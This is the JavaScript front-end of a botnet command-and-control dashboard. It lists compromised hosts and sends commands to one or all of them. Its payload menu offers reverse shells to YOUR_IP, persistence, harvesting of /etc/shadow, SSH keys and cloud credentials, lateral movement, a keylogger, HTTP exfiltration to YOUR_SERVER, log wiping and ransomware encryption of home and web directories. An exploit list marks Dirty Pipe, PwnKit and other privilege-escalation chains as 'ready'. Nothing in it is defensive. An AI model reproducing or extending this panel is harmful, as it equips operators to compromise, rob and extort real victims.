const API = '/api';
let ws = null;
let bots = {};
let commands = {};

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    loadStats();
    loadBots();
    loadCommands();
    loadPayloads();
    loadExploits();

    // Navigation
    document.querySelectorAll('.nav-links li').forEach(li => {
        li.addEventListener('click', () => {
            document.querySelectorAll('.nav-links li').forEach(l => l.classList.remove('active'));
            li.classList.add('active');
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.getElementById('view-' + li.dataset.view).classList.add('active');
        });
    });

    // Refresh
    document.getElementById('btn-refresh').addEventListener('click', () => {
        loadStats(); loadBots();
    });

    // Quick command
    document.getElementById('btn-send-cmd').addEventListener('click', sendQuickCommand);

    // Command all
    document.getElementById('btn-command-all').addEventListener('click', () => {
        showCommandModal('all');
    });

    // Broadcast
    document.getElementById('btn-broadcast').addEventListener('click', () => {
        showCommandModal('all');
    });

    // Search
    document.getElementById('bot-search').addEventListener('keyup', filterBots);

    // Auto-refresh
    setInterval(loadStats, 10000);
    setInterval(loadBots, 15000);

    // Connect to WebSocket for live updates
    connectWS();
});

function connectWS() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${protocol}//${window.location.host}/ws`);

    ws.onopen = () => {
        addActivity('system', 'WebSocket connected');
    };

    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            handleWSMessage(data);
        } catch(e) {}
    };

    ws.onclose = () => {
        addActivity('system', 'WebSocket disconnected, reconnecting...');
        setTimeout(connectWS, 5000);
    };
}

function handleWSMessage(data) {
    switch(data.t) {
        case 'bot_register':
            addActivity('bot', `New bot: ${data.hostname} (${data.bid.slice(0,8)})`);
            break;
        case 'bot_result':
            addActivity('result', `[${data.bid.slice(0,8)}] ${data.out ? data.out.slice(0,80) : 'completed'}`);
            break;
    }
}

function addActivity(type, message) {
    const log = document.getElementById('activity-log');
    const entry = document.createElement('div');
    entry.className = 'activity-entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="time">[${time}]</span> <span class="event">${type}</span> ${escapeHTML(message)}`;
    log.insertBefore(entry, log.firstChild);
    while (log.children.length > 100) log.removeChild(log.lastChild);
}

function escapeHTML(str) {
    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// Stats
async function loadStats() {
    try {
        const r = await fetch(`${API}/stats`);
        const stats = await r.json();
        document.getElementById('total-bots').textContent = stats.total_bots;
        document.getElementById('connected-bots').textContent = stats.connected;
        document.getElementById('root-bots').textContent = stats.root_bots;
    } catch(e) {}
}

// Bots
async function loadBots() {
    try {
        const r = await fetch(`${API}/bots`);
        const list = await r.json();
        bots = {};
        list.forEach(b => { bots[b.id] = b; });
        renderBots();
    } catch(e) {}
}

function renderBots() {
    const tbody = document.getElementById('bot-list');
    tbody.innerHTML = '';
    Object.values(bots).forEach(b => {
        const tr = document.createElement('tr');
        const status = b.connected ? 'online' : 'offline';
        tr.innerHTML = `
            <td title="${b.id}">${b.id.slice(0,12)}...</td>
            <td>${escapeHTML(b.hostname)}</td>
            <td>${b.ip || '-'}</td>
            <td>${b.os || '-'}/${b.arch || '-'}</td>
            <td>${b.kernel ? b.kernel.slice(0,30) : '-'}</td>
            <td class="status-${status}">${status}</td>
            <td>${b.privilege || 'user'}</td>
            <td>L${b.layer + 1}</td>
            <td><input type="text" value="${b.tag || ''}" class="input tag-input" style="width:80px;margin:0" data-bot="${b.id}" placeholder="tag"></td>
            <td>
                <button class="btn btn-cmd-single" data-bot="${b.id}" onclick="showCommandModal('${b.id}')">cmd</button>
            </td>
        `;
        tbody.appendChild(tr);
    });

    // Tag inputs
    document.querySelectorAll('.tag-input').forEach(inp => {
        inp.addEventListener('change', async (e) => {
            const botId = e.target.dataset.bot;
            const tag = e.target.value;
            await fetch(`${API}/bots/${botId}/tag`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({tag})
            });
        });
    });
}

function filterBots() {
    const q = document.getElementById('bot-search').value.toLowerCase();
    document.querySelectorAll('#bot-list tr').forEach(tr => {
        tr.style.display = tr.textContent.toLowerCase().includes(q) ? '' : 'none';
    });
}

// Commands
async function loadCommands() {
    try {
        const r = await fetch(`${API}/commands`);
        const list = await r.json();
        commands = {};
        list.forEach(c => { commands[c.id] = c; });
        renderCommands();
    } catch(e) {}
}

function renderCommands() {
    const tbody = document.getElementById('cmd-list');
    tbody.innerHTML = '';
    Object.values(commands).slice(0, 100).forEach(c => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${c.id.slice(0,8)}</td>
            <td>${c.target}</td>
            <td>${escapeHTML(c.action)}</td>
            <td class="status-${c.status}">${c.status}</td>
            <td>${c.result ? escapeHTML(c.result.slice(0,60)) : '-'}</td>
            <td>${new Date(c.created_at).toLocaleTimeString()}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function sendCommand(target, action, args) {
    const body = {
        bot_id: target === 'all' ? '' : target,
        action: action,
        args: args || ''
    };
    await fetch(`${API}/command`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(body)
    });
    addActivity('command', `${action} -> ${target}`);
    setTimeout(loadCommands, 1000);
}

function sendQuickCommand() {
    const action = document.getElementById('cmd-action').value;
    const args = document.getElementById('cmd-args').value;
    sendCommand('all', action, args);
}

function showCommandModal(target) {
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.innerHTML = `
        <div class="modal">
            <h3>Send Command ${target === 'all' ? '(All Bots)' : ''}</h3>
            <select id="modal-action" class="input">
                <option value="exec">Execute Command</option>
                <option value="enum">System Enumeration</option>
                <option value="harvest">Harvest Credentials</option>
                <option value="persist">Install Persistence</option>
                <option value="pivot">Setup Pivot</option>
                <option value="exfil">Exfiltrate Data</option>
                <option value="wipe">Forensic Wipe</option>
                <option value="ransomware">Ransomware Encrypt</option>
                <option value="ransomware_decrypt">Ransomware Decrypt</option>
                <option value="selfdestruct">Self Destruct</option>
            </select>
            <input type="text" id="modal-args" class="input" placeholder="Arguments (e.g., {&quot;cmd&quot;:&quot;whoami&quot;})">
            <div class="modal-actions">
                <button class="btn" onclick="this.closest('.modal-overlay').remove()">Cancel</button>
                <button class="btn btn-accent" onclick="doSendModal('${target}')">Send</button>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);
}

async function doSendModal(target) {
    const action = document.getElementById('modal-action').value;
    const args = document.getElementById('modal-args').value;
    const overlay = document.querySelector('.modal-overlay');
    if (overlay) overlay.remove();
    await sendCommand(target, action, args);
}

// Payloads
function loadPayloads() {
    const payloads = [
        {name: 'Reverse Shell', desc: 'Spawn reverse or bind shell on target', action: 'payload', args: '{"name":"reverse_shell","host":"YOUR_IP","port":"4444"}'},
        {name: 'Persistence', desc: 'Install via systemd, cron, .bashrc hooks, and LD_PRELOAD', action: 'payload', args: '{"name":"persist"}'},
        {name: 'Credential Harvest', desc: 'Extract /etc/shadow, SSH keys, env vars, DB configs, cloud creds', action: 'payload', args: '{"name":"harvest"}'},
        {name: 'Lateral Movement', desc: 'Inject SSH keys, scan known_hosts, discover PSSH/Ansible infrastructure', action: 'payload', args: '{"name":"lateral"}'},
        {name: 'Network Pivot', desc: 'Enable IP forwarding, SOCKS proxy, NAT masquerade', action: 'payload', args: '{"name":"pivot","port":"1080"}'},
        {name: 'Keylogger', desc: 'Capture keystrokes from /dev/input devices', action: 'payload', args: '{"name":"keylog"}'},
        {name: 'Packet Sniff', desc: 'Capture network traffic with tcpdump', action: 'payload', args: '{"name":"sniff","interface":"eth0","filter":"port 80"}'},
        {name: 'System Enum', desc: 'Full system enumeration: kernel, users, network, docker, k8s, cloud', action: 'payload', args: '{"name":"enum"}'},
        {name: 'Data Exfil', desc: 'Exfiltrate binary and harvested data via HTTP POST', action: 'payload', args: '{"name":"exfil","target":"http://YOUR_SERVER","method":"http"}'},
        {name: 'Forensic Wipe', desc: 'Clear logs, history, journal, auditd, wtmp, randomize MAC', action: 'payload', args: '{"name":"wipe"}'},
        {name: 'Ransomware', desc: 'AES-256-GCM file encryption with operator-defined key. Specify key in args or let it generate one.', action: 'payload', args: '{"name":"ransomware","key":"","dirs":"/home,/root,/var/www"}'},
        {name: 'Ransomware Decrypt', desc: 'Decrypt .centipede files using the same key used for encryption.', action: 'payload', args: '{"name":"ransomware_decrypt","key":"YOUR_HEX_KEY"}'},
        {name: 'Self Destruct', desc: 'Remove all traces, delete binary, and exit', action: 'payload', args: '{"name":"selfdestruct"}'},
    ];

    const grid = document.getElementById('payload-list');
    payloads.forEach(p => {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.innerHTML = `<h3>${p.name}</h3><p>${p.desc}</p>`;
        card.addEventListener('click', () => {
            document.getElementById('cmd-action').value = p.action;
            document.getElementById('cmd-args').value = p.args;
            addActivity('payload', `Selected: ${p.name}`);
        });
        grid.appendChild(card);
    });
}

// Exploits
function loadExploits() {
    const exploits = [
        {
            name: 'dirtyfrag',
            cve: 'CVE-2026-43284 + CVE-2026-43500',
            desc: 'xfrm-ESP + RxRPC page-cache write chain. Linux 4.x through 6.x. Required kernel modules: esp4, rxrpc.',
            status: 'ready',
            range: '2017 - Present'
        },
        {
            name: 'Dirty Pipe',
            cve: 'CVE-2022-0847',
            desc: 'Direct pipe write to overwrite read-only files. Linux 5.8 - 5.16.',
            status: 'ready',
            range: '5.8 - 5.16'
        },
        {
            name: 'PwnKit',
            cve: 'CVE-2021-4034',
            desc: 'pkexec argument parsing vulnerability. All distributions with pkexec installed.',
            status: 'ready',
            range: '2009 - 2022'
        },
        {
            name: 'GameOverlay',
            cve: 'CVE-2023-3269',
            desc: 'Ubuntu overlayfs LPE. Ubuntu kernels with overlayfs support.',
            status: 'ready',
            range: '5.x - 6.x (Ubuntu)'
        },
    ];

    const list = document.getElementById('exploit-list');
    exploits.forEach(e => {
        const item = document.createElement('div');
        item.className = 'exploit-item';
        item.innerHTML = `
            <h4>${e.name} <span class="status ${e.status}">${e.status}</span></h4>
            <p><strong>CVE:</strong> ${e.cve}</p>
            <p>${e.desc}</p>
            <p><strong>Kernel Range:</strong> ${e.range}</p>
        `;
        list.appendChild(item);
    });
}
